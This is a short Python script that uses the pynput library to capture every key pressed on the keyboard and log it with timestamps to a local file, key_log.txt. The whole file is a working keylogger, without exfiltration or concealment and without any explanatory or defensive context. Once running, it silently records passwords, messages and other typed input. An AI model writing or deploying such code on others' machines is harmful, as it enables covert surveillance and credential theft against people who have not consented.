from pynput.keyboard import Key, Listener
import logging

log_dir = ""  # Set this to a valid directory if needed

# Configure logging
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s : %(message)s')

def on_press(key):
    logging.info(str(key))  # Log the key as a string

# Start listening to keyboard events
with Listener(on_press=on_press) as listener:
    listener.join()

